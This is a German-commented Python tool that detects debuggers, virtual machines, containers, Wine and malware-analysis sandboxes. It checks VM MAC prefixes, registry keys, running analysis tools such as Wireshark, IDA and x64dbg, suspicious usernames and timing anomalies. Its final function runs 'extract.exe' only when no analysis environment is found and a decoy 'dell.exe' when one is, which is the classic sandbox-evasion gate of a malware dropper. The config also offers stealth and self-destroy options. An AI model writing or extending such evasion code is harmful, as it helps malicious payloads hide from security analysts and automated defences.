import os
import time
import ctypes
import platform
import uuid
import getpass
import socket
import logging
try:
    from colorama import init as colorama_init, Fore, Style
    COLORAMA_AVAILABLE = True
    colorama_init(autoreset=True)
except ImportError:
    COLORAMA_AVAILABLE = False
import json
from enum import Enum, auto
from typing import Dict, Tuple, Any
from functools import wraps
import concurrent.futures
from logging.handlers import RotatingFileHandler
import argparse
import traceback

# Version
__version__ = "2.0.0"

# Module, die optional sind, aber zusätzliche Funktionalität ermöglichen
OPTIONAL_MODULES = {
    "psutil": False,
    "pefile": False,
    "requests": False,
    "cryptography": False,
    "pywin32": False,
}

# Define a global variable to track if psutil is available
PSUTIL_AVAILABLE = False

# Optionale Module importieren
try:
    import psutil
    OPTIONAL_MODULES["psutil"] = True
    PSUTIL_AVAILABLE = True
except ImportError:
    pass

try:
    import pefile
    OPTIONAL_MODULES["pefile"] = True
except ImportError:
    pass

try:
    import requests
    OPTIONAL_MODULES["requests"] = True
except ImportError:
    pass

try:
    import cryptography
    import cryptography.hazmat.primitives.hashes as hashes
    OPTIONAL_MODULES["cryptography"] = True
except ImportError:
    pass

if platform.system() == "Windows":
    try:
        import win32api
        import win32process
        import win32security
        OPTIONAL_MODULES["pywin32"] = True
    except ImportError:
        pass

# Konfiguration mit erweiterten Optionen
class Config:
    """Zentrale Konfigurationsklasse für alle Einstellungen."""
    
    class LogLevel(Enum):
        """Aufzählung für Log-Level mit menschenlesbaren Namen."""
        DEBUG = logging.DEBUG
        INFO = logging.INFO
        WARNING = logging.WARNING
        ERROR = logging.ERROR
        CRITICAL = logging.CRITICAL
    
    class DetectionMode(Enum):
        """Erkennungsmodi für verschiedene Anwendungsfälle."""
        NORMAL = auto()       # Standard - Balance aus Genauigkeit und Geschwindigkeit
        PARANOID = auto()     # Höchste Empfindlichkeit, mehr False Positives
        STEALTH = auto()      # Versteckte Aktivität, weniger aggressive Checks
        QUICK = auto()        # Schneller Scan mit nur grundlegenden Checks
        THOROUGH = auto()     # Umfassender Scan mit allen verfügbaren Checks
    
    def __init__(self):
        """Initialisiere Standardkonfiguration."""
        # Performance-Einstellungen
        self.check_timing_loops = 5
        self.sleep_check_seconds = 2
        self.sleep_threshold = 0.4
        self.min_cores = 2
        self.min_memory_gb = 2
        self.timeout_seconds = 15
        self.parallel_execution = True
        self.max_threads = min(32, (os.cpu_count() or 4) * 2)
        
        # Verhalten und Strategie
        self.detection_mode = self.DetectionMode.NORMAL
        self.exit_on_detection = False
        self.counter_measures = False
        self.self_destroy_on_detection = False
        self.obfuscate_output = False
        
        # Logging und Output
        self.log_level = self.LogLevel.INFO
        self.log_to_file = False
        self.log_file = "sandbox_detector.log"
        self.report_format = "text"  # Optionen: text, json, html
        self.detailed_report = False
        
        # Spezialisierte Erkennung
        self.check_internet = True
        self.check_file_system = True
        self.check_hardware = True
        self.check_processes = True
        self.check_registry = True  # Immer aktiv
        self.check_memory = True

        # Counter-Evasion
        self.randomize_check_order = False  # Immer gleiche Reihenfolge
        self.add_delays = False             # Keine künstlichen Delays
        self.delay_min_ms = 10
        self.delay_max_ms = 50
        
        # Selbstschutz
        self.integrity_checks = True
        self.watchdog_enabled = True
        
    def from_dict(self, config_dict: Dict[str, Any]) -> 'Config':
        """Konfiguration aus Dictionary laden."""
        valid_attrs = {attr for attr in dir(self) if not attr.startswith('_') and attr != 'from_dict' and attr != 'to_dict' and not callable(getattr(self, attr))}
        
        for key, value in config_dict.items():
            if key in valid_attrs:
                if key == 'detection_mode' and isinstance(value, str):
                    try:
                        setattr(self, key, self.DetectionMode[value.upper()])
                    except KeyError:
                        continue
                elif key == 'log_level' and isinstance(value, str):
                    try:
                        setattr(self, key, self.LogLevel[value.upper()])
                    except KeyError:
                        continue
                else:
                    setattr(self, key, value)
        return self
    
    def to_dict(self) -> Dict[str, Any]:
        """Konfiguration in Dictionary konvertieren."""
        result = {}
        for attr in dir(self):
            if not attr.startswith('_') and attr != 'from_dict' and attr != 'to_dict' and not callable(getattr(self, attr)):
                value = getattr(self, attr)
                if isinstance(value, Enum):
                    result[attr] = value.name
                else:
                    result[attr] = value
        return result
    
    @classmethod
    def load_from_file(cls, file_path: str) -> 'Config':
        """Konfiguration aus JSON-Datei laden."""
        config = cls()
        try:
            with open(file_path, 'r') as f:
                config_dict = json.load(f)
                return config.from_dict(config_dict)
        except (IOError, json.JSONDecodeError) as e:
            print(f"Fehler beim Laden der Konfiguration: {e}")
            return config
    
    def save_to_file(self, file_path: str) -> bool:
        """Konfiguration in JSON-Datei speichern."""
        try:
            with open(file_path, 'w') as f:
                json.dump(self.to_dict(), f, indent=2)
            return True
        except IOError as e:
            print(f"Fehler beim Speichern der Konfiguration: {e}")
            return False

# Globale Konfigurationsinstanz
CONFIG = Config()

# Verbesserte Logger-Einrichtung mit RotatingFileHandler

def setup_logger(name="sandbox_detector", 
                 level=None, 
                 log_to_file=None, 
                 log_file=None) -> logging.Logger:
    """Erweiterte Logger-Einrichtung mit Datei- und Konsolenausgabe, Log-Rotation und Stacktraces."""
    level = level or CONFIG.log_level.value
    log_to_file = log_to_file if log_to_file is not None else CONFIG.log_to_file
    log_file = log_file or CONFIG.log_file
    logger = logging.getLogger(name)
    logger.setLevel(level)
    for handler in logger.handlers[:]:
        logger.removeHandler(handler)
    formatter = logging.Formatter(
        '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    console_handler = logging.StreamHandler()
    console_handler.setLevel(level)
    console_handler.setFormatter(formatter)
    logger.addHandler(console_handler)
    if log_to_file:
        try:
            file_handler = RotatingFileHandler(log_file, maxBytes=5_000_000, backupCount=3)
            file_handler.setLevel(level)
            file_handler.setFormatter(formatter)
            logger.addHandler(file_handler)
        except IOError as e:
            logger.error(f"Konnte Log-Datei nicht öffnen: {e}")
    return logger

# Initialen Logger erstellen
logger = setup_logger(level=CONFIG.log_level.value)

def requires_psutil(func):
    """Dekorator, der prüft, ob psutil verfügbar ist."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        if not PSUTIL_AVAILABLE:
            logger.warning(f"Funktion {func.__name__} übersprungen: psutil nicht installiert")
            return False
        return func(*args, **kwargs)
    return wrapper

def timing_decorator(func):
    """Misst die Ausführungszeit einer Funktion."""
    @wraps(func)
    def wrapper(*args, **kwargs):
        start = time.perf_counter()
        result = func(*args, **kwargs)
        elapsed = time.perf_counter() - start
        logger.debug(f"{func.__name__} ausgeführt in {elapsed:.4f} Sekunden")
        return result
    return wrapper

def is_debugger_present() -> bool:
    """Prüft auf angehängte Debugger (Windows, Linux, macOS)."""
    try:
        if platform.system() == "Windows":
            return ctypes.windll.kernel32.IsDebuggerPresent() != 0
        elif platform.system() == "Linux":
            # Unter Linux kann man nach Debugger-Traces suchen
            with open('/proc/self/status', 'r') as f:
                content = f.read()
                return 'TracerPid:\t0' not in content
        elif platform.system() == "Darwin":  # macOS
            # Vereinfachter Check für macOS
            import subprocess
            output = subprocess.run(["ps", "-p", str(os.getpid()), "-o", "state"], 
                                   capture_output=True, text=True).stdout
            return "T" in output  # 'T' steht für gestoppten Prozess
        return False
    except Exception as e:
        logger.debug(f"Fehler beim Debugger-Check: {str(e)}")
        return False

@timing_decorator
def check_sleep_skipping(seconds: float = None, threshold: float = None) -> bool:
    """Prüft, ob sleep manipuliert oder übersprungen wird."""
    seconds = seconds or CONFIG.sleep_check_seconds
    threshold = threshold or CONFIG.sleep_threshold
    
    start = time.perf_counter()
    time.sleep(seconds)
    end = time.perf_counter()
    actual_time = end - start
    expected_time = seconds
    
    result = actual_time < (expected_time - threshold)
    if result:
        logger.debug(f"Sleep-Anomalie: Erwartet ~{expected_time}s, tatsächlich {actual_time:.2f}s")
    
    return result

def is_virtual_machine() -> bool:
    """Erkennt gängige virtuelle Maschinen anhand verschiedener Indikatoren."""
    suspicious_keywords = ['vbox', 'virtual', 'vmware', 'qemu', 'xen', 'hyperv']
    
    # System-Information prüfen
    try:
        system_info = platform.uname()
        combined = " ".join([str(i) for i in system_info]).lower()
        if any(keyword in combined for keyword in suspicious_keywords):
            return True
    except Exception as e:
        logger.debug(f"Fehler bei VM-Erkennung (System-Info): {str(e)}")
    
    # DMI-Informationen prüfen (Linux)
    if platform.system() == "Linux":
        dmi_files = [
            "/sys/class/dmi/id/product_name",
            "/sys/class/dmi/id/sys_vendor",
            "/sys/class/dmi/id/board_vendor"
        ]
        
        for file in dmi_files:
            try:
                if os.path.exists(file):
                    with open(file, 'r') as f:
                        content = f.read().lower()
                        if any(keyword in content for keyword in suspicious_keywords):
                            return True
            except Exception:
                pass
    
    # Windows-Registry prüfen
    if platform.system() == "Windows":
        try:
            import winreg
            keys = [
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\VBoxGuest"),
                (winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\vmware"),
                (winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0")
            ]
            
            for hkey, path in keys:
                try:
                    winreg.OpenKey(hkey, path)
                    return True
                except Exception:
                    pass
        except ImportError:
            pass
            
    return False

@requires_psutil
def check_running_processes() -> bool:
    """Prüft auf Analyse- oder Debugging-Tools."""
    suspicious = [
        'wireshark', 'procmon', 'procexpl', 'ida', 'ollydbg', 'x64dbg', 'ghidra',
        'dnspy', 'immunity', 'process explorer', 'process monitor', 'fiddler',
        'charles', 'burp', 'radare', 'cutter', 'binary ninja'
    ]
    
    try:
        for proc in psutil.process_iter(['name', 'cmdline']):
            try:
                info = proc.info
                name = (info.get('name', '') or '').lower()
                cmdline = ' '.join(info.get('cmdline', []) or []).lower()
                
                if any(p in name or p in cmdline for p in suspicious):
                    logger.debug(f"Verdächtiger Prozess gefunden: {name}")
                    return True
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
    except Exception as e:
        logger.debug(f"Fehler bei Prozess-Check: {str(e)}")
        
    return False

@requires_psutil
def check_low_resources(min_cores: int = None, min_memory_gb: float = None) -> bool:
    """Erkennt ungewöhnlich niedrige Systemressourcen."""
    min_cores = min_cores or CONFIG.min_cores
    min_memory_gb = min_memory_gb or CONFIG.min_memory_gb
    
    try:
        cores = psutil.cpu_count(logical=False) or psutil.cpu_count()
        mem = psutil.virtual_memory().total / (1024 ** 3)  # In GB
        
        if cores < min_cores:
            logger.debug(f"Wenige CPU-Kerne erkannt: {cores}")
            return True
        if mem < min_memory_gb:
            logger.debug(f"Wenig RAM erkannt: {mem:.2f} GB")
            return True
            
        return False
    except Exception as e:
        logger.debug(f"Fehler bei Ressourcen-Check: {str(e)}")
        return False

def check_mac_address() -> bool:
    """Prüft MAC-Adresse gegen bekannte VM-Präfixe."""
    vm_prefixes = [
        '000569',  # VMware
        '000c29',  # VMware
        '001c14',  # VMware
        '005056',  # VMware
        '080027',  # VirtualBox
        '525400',  # QEMU
        '000f4b',  # VirtualIron 
        '00163e',  # Xen
        '001111'   # Microsoft Hyper-V
    ]
    
    try:
        mac = uuid.getnode()
        mac_hex = f"{mac:012x}"
        
        for prefix in vm_prefixes:
            if mac_hex.startswith(prefix):
                logger.debug(f"Verdächtige MAC-Adresse: {mac_hex}")
                return True
                
        return False
    except Exception as e:
        logger.debug(f"Fehler bei MAC-Adresse-Check: {str(e)}")
        return False

def check_suspicious_usernames() -> bool:
    """Prüft Benutzername und Hostname auf Analyse-Hinweise."""
    suspicious = [
        'sandbox', 'malware', 'virus', 'sample', 'test', 'analyst', 
        'analysis', 'debug', 'lab', 'vbox', 'vm', 'detter', 'cuckoo'
    ]
    
    try:
        user = getpass.getuser().lower()
        host = socket.gethostname().lower()
        
        for term in suspicious:
            if term in user or term in host:
                logger.debug(f"Verdächtiger Name gefunden: {user}@{host}")
                return True
                
        return False
    except Exception as e:
        logger.debug(f"Fehler bei Username-Check: {str(e)}")
        return False

@timing_decorator
def timing_discrepancy_check(repeat: int = None) -> bool:
    """Prüft auf abnormale schnelle Schleifenausführung (instrumentierte Zeitnahme)."""
    repeat = repeat or CONFIG.check_timing_loops
    anomalies = 0
    
    for i in range(repeat):
        start = time.perf_counter()
        # Eine Operation, die konsistent Zeit benötigt
        operations = 10_000_000
        for _ in range(operations):
            pass
        end = time.perf_counter()
        elapsed = end - start
        
        # Auf ungewöhnlich schnelle Ausführung prüfen
        if elapsed < 0.2:  # Schwellenwert anpassen je nach System
            anomalies += 1
            logger.debug(f"Timing-Anomalie in Durchlauf {i+1}: {elapsed:.6f}s")
            
    return anomalies >= (repeat // 2)

@requires_psutil
def check_parent_process() -> bool:
    """Erkennt, ob von potenziell verdächtigem Elternprozess gestartet."""
    try:
        parent = psutil.Process(os.getppid())
        name = parent.name().lower()
        
        # Typische legitime Elternprozesse
        allowed = ['explorer.exe', 'cmd.exe', 'python.exe', 'powershell.exe', 
                  'bash', 'zsh', 'sh', 'terminal', 'konsole', 'gnome-terminal']
        
        # Verdächtige Elternprozesse
        suspicious = ['gdb', 'lldb', 'ida', 'ollydbg', 'x64dbg', 'windbg', 'cuckoo']
        
        if any(s in name for s in suspicious):
            logger.debug(f"Verdächtiger Elternprozess: {name}")
            return True
            
        # Prüfen wir auch die Befehlszeile
        try:
            cmdline = ' '.join(parent.cmdline()).lower()
            if any(s in cmdline for s in suspicious):
                logger.debug(f"Verdächtige Elternprozess-Commandline: {cmdline}")
                return True
        except (psutil.AccessDenied, psutil.NoSuchProcess):
            pass
            
        return False
    except Exception as e:
        logger.debug(f"Fehler bei Elternprozess-Check: {str(e)}")
        return False

def check_execution_time() -> bool:
    """Prüft, ob das Programm ungewöhnlich langsam läuft (Breakpoints)."""
    start_time = getattr(check_execution_time, 'start_time', None)
    
    if start_time is None:
        # Erste Ausführung, Zeit speichern
        check_execution_time.start_time = time.time()
        return False
    
    # Zeit seit Programmstart
    elapsed = time.time() - check_execution_time.start_time
    # Ungewöhnlich lange Ausführungszeit kann auf Breakpoints hindeuten
    if elapsed > 60:  # Mehr als 1 Minute
        logger.debug(f"Ungewöhnlich lange Ausführungszeit: {elapsed:.2f}s")
        return True
        
    return False

def check_docker_container() -> bool:
    """Prüft, ob Code in einem Docker-Container läuft."""
    # Prüfe auf Docker-spezifische Dateien
    docker_files = ['/.dockerenv', '/proc/1/cgroup']
    
    for file in docker_files:
        if os.path.exists(file):
            try:
                with open(file, 'r') as f:
                    content = f.read()
                    if '/.dockerenv' in file or 'docker' in content:
                        return True
            except Exception:
                pass
                
    return False

def check_wine_environment() -> bool:
    """Prüft, ob Code unter Wine ausgeführt wird."""
    if platform.system() == "Windows":
        # Prüfe auf Wine-spezifische Umgebungsvariablen
        wine_vars = ['WINELOADERNOEXEC', 'WINEDEBUG', 'WINEPREFIX']
        return any(var in os.environ for var in wine_vars)
        
    return False

def run_all_checks(randomize: bool = None, timeout: int = None) -> Dict[str, bool]:
    """
    Führt alle Prüfungen aus und gibt Ergebnisse zurück.
    - Optional: Reihenfolge randomisieren, Timeout setzen.
    - Erweiterbar für weitere Checks (Cloud, Registry, Netzwerkadapter etc.)
    """
    import random
    checks = {
        "Debugger erkannt": is_debugger_present,
        "Sleep-Skipping festgestellt": check_sleep_skipping,
        "Virtuelle Umgebung erkannt": is_virtual_machine,
        "Verdächtige MAC-Adresse": check_mac_address,
        "Verdächtiger Benutzername/Hostname": check_suspicious_usernames,
        "Timing-Anomalien": timing_discrepancy_check,
        "Docker-Container erkannt": check_docker_container,
        "Wine-Umgebung erkannt": check_wine_environment
    }
    # Füge psutil-abhängige Prüfungen hinzu, wenn verfügbar
    if PSUTIL_AVAILABLE:
        psutil_checks = {
            "Analyseprozesse entdeckt": check_running_processes,
            "Geringe Systemressourcen": check_low_resources,
            "Verdächtiger Elternprozess": check_parent_process
        }
        checks.update(psutil_checks)
    
    if randomize or CONFIG.randomize_check_order:
        items = list(checks.items())
        random.shuffle(items)
        checks = dict(items)
    
    timeout = timeout or CONFIG.timeout_seconds
    results = {}
    if CONFIG.parallel_execution:
        with concurrent.futures.ThreadPoolExecutor(max_workers=CONFIG.max_threads) as executor:
            future_to_check = {
                executor.submit(func): name 
                for name, func in checks.items()
            }
            try:
                for future in concurrent.futures.as_completed(future_to_check, timeout=timeout):
                    check_name = future_to_check[future]
                    try:
                        results[check_name] = future.result()
                    except Exception as e:
                        logger.error(f"Fehler bei {check_name}: {str(e)}\n{traceback.format_exc()}")
                        results[check_name] = False
            except concurrent.futures.TimeoutError:
                logger.error("Timeout bei der Ausführung der Checks.")
    else:
        for name, func in checks.items():
            try:
                results[name] = func()
            except Exception as e:
                logger.error(f"Fehler bei {name}: {str(e)}\n{traceback.format_exc()}")
                results[name] = False
    results["Ungewöhnlich lange Ausführungszeit"] = check_execution_time()
    return results

def format_result(results: Dict[str, bool]) -> Tuple[str, int]:
    """Formatiert die Ergebnisse für die Ausgabe."""
    output = []
    output.append("Sandbox- & Debugger-Analyse Ergebnisse:\n")

    suspicious_count = 0
    for name, triggered in results.items():
        if COLORAMA_AVAILABLE:
            if triggered:
                status = f"{Fore.RED}Ja{Style.RESET_ALL}"
            else:
                status = f"{Fore.GREEN}Nein{Style.RESET_ALL}"
        else:
            status = "Ja" if triggered else "Nein"
        output.append(f"{name:<35}: {status}")
        if triggered:
            suspicious_count += 1

    output.append("\nGesamtergebnis:")
    if COLORAMA_AVAILABLE:
        if suspicious_count == 0:
            output.append(f"{Fore.GREEN}Keine Hinweise auf Debugger, VM oder Analyseumgebung gefunden.{Style.RESET_ALL}")
        elif suspicious_count <= 2:
            output.append(f"{Fore.YELLOW}Möglicherweise ungewöhnliche Umgebung – bitte weiter analysieren.{Style.RESET_ALL}")
        else:
            output.append(f"{Fore.RED}Hohe Wahrscheinlichkeit für Debugging oder Sandbox erkannt!{Style.RESET_ALL}")
    else:
        if suspicious_count == 0:
            output.append("Keine Hinweise auf Debugger, VM oder Analyseumgebung gefunden.")
        elif suspicious_count <= 2:
            output.append("Möglicherweise ungewöhnliche Umgebung – bitte weiter analysieren.")
        else:
            output.append("Hohe Wahrscheinlichkeit für Debugging oder Sandbox erkannt!")

    return "\n".join(output), suspicious_count

def main() -> int:
    """
    Hauptfunktion. Unterstützt CLI-Argumente für Modus, Report, Konfiguration etc.
    """
    parser = argparse.ArgumentParser(description="Sandbox/VM/Debugger-Erkennung und Steuerung.")
    parser.add_argument("--config", type=str, help="Pfad zu externer Konfigurationsdatei (JSON)")
    parser.add_argument("--mode", type=str, choices=[m.name.lower() for m in Config.DetectionMode], help="Detection Mode (z.B. normal, paranoid, stealth, quick, thorough)")
    parser.add_argument("--report", type=str, help="Report-Datei (JSON oder HTML)")
    parser.add_argument("--format", type=str, choices=["text", "json", "html"], help="Report-Format")
    parser.add_argument("--timeout", type=int, help="Timeout für Checks (Sekunden)")
    parser.add_argument("--no-parallel", action="store_true", help="Checks nicht parallel ausführen")
    args = parser.parse_args()
    # Konfiguration ggf. laden/überschreiben
    if args.config:
        config = Config.load_from_file(args.config)
        globals()["CONFIG"] = config
    if args.mode:
        CONFIG.detection_mode = Config.DetectionMode[args.mode.upper()]
    if args.format:
        CONFIG.report_format = args.format
    if args.no_parallel:
        CONFIG.parallel_execution = False
    if args.timeout:
        CONFIG.timeout_seconds = args.timeout
    logger.info(f"Starte Sandbox- & Debugger-Erkennungsmodule im Modus {CONFIG.detection_mode.name} ...")
    if not PSUTIL_AVAILABLE:
        logger.warning("Psutil nicht installiert. Einige Prüfungen werden übersprungen.")
        logger.warning("Für vollständige Analyse: pip install psutil")
    results = run_all_checks()
    output, suspicious_count = format_result(results)
    print(output)
    # Reporting/Export
    if args.report:
        try:
            if CONFIG.report_format == "json":
                with open(args.report, "w", encoding="utf-8") as f:
                    json.dump(results, f, indent=2, ensure_ascii=False)
            elif CONFIG.report_format == "html":
                with open(args.report, "w", encoding="utf-8") as f:
                    f.write("<html><body><h2>Sandbox-Analyse</h2><pre>" + output + "</pre></body></html>")
            else:
                with open(args.report, "w", encoding="utf-8") as f:
                    f.write(output)
            logger.info(f"Report gespeichert: {args.report}")
        except Exception as e:
            logger.error(f"Fehler beim Speichern des Reports: {e}\n{traceback.format_exc()}")
    return suspicious_count

def execute_appropriate_program(suspicious_count):
    """
    Führt das entsprechende Programm aus, abhängig davon, ob eine Sandbox/VM erkannt wurde.
    
    Args:
        suspicious_count: Anzahl der erkannten verdächtigen Indikatoren
    """
    import subprocess
    
    # Pfade zu den .exe-Dateien
    normal_exe = "extract.exe"
    sandbox_exe = "dell.exe"

    def file_exists_and_executable(path):
        return os.path.isfile(path) and os.access(path, os.X_OK)

    try:
        if suspicious_count == 0:
            # Keine Sandbox/VM erkannt - führe normales Programm aus
            if file_exists_and_executable(normal_exe):
                logger.info(f"Führe {normal_exe} aus...")
                subprocess.Popen([normal_exe])
            else:
                logger.error(f"{normal_exe} nicht gefunden oder nicht ausführbar.")
        else:
            # Sandbox/VM erkannt - führe alternatives Programm aus
            if file_exists_and_executable(sandbox_exe):
                logger.info(f"Führe {sandbox_exe} aus...")
                subprocess.Popen([sandbox_exe])
            else:
                logger.error(f"{sandbox_exe} nicht gefunden oder nicht ausführbar.")
    except Exception as e:
        logger.error(f"Fehler beim Ausführen des Programms: {e}")

# Verbesserungsvorschläge (Kommentare):

# 1. Modularisierung: Die Checks könnten in ein separates Modul ausgelagert werden, um die Übersichtlichkeit zu erhöhen.
# 2. Logging: Die Log-Ausgaben könnten optional farbig gestaltet werden (z.B. mit colorama), um die Lesbarkeit zu verbessern.
# 3. Fehlerbehandlung: Die Fehlerausgaben könnten konsistenter gestaltet und ggf. an den Benutzer weitergeleitet werden.
# 4. Konfigurierbarkeit: Mehr Einstellungen könnten über die CLI oder eine Konfigurationsdatei steuerbar gemacht werden.
# 5. Unit-Tests: Für die einzelnen Checks könnten Unit-Tests geschrieben werden, um die Zuverlässigkeit zu erhöhen.
# 6. Performance: Die parallele Ausführung ist bereits vorhanden, könnte aber optional auf multiprocessing erweitert werden.
# 7. Erweiterbarkeit: Die Checks könnten als Plug-ins gestaltet werden, um neue Prüfungen einfacher hinzuzufügen.
# 8. Dokumentation: Docstrings und Kommentare könnten erweitert werden, um die Wartbarkeit zu verbessern.
# 9. Security: Die Ausführung externer Programme (extract.exe, dell.exe) sollte besser abgesichert werden (z.B. Existenz prüfen).
# 10. Reporting: Das HTML-Reporting könnte optisch ansprechender gestaltet werden (z.B. mit Tabellen und CSS).
# 11. Internationalisierung: Die Ausgaben könnten mehrsprachig gestaltet werden (z.B. Deutsch/Englisch).
# 12. Ressourcenverbrauch: Die Checks könnten ressourcenschonender gestaltet werden, z.B. weniger aggressive Schleifen.
# 13. Optional: Telemetrie/Statistiken könnten anonymisiert gesammelt werden, um die Erkennungsrate zu verbessern.

if __name__ == "__main__":
    suspicious_count = main()
    # Führe das entsprechende Programm aus
    execute_appropriate_program(suspicious_count)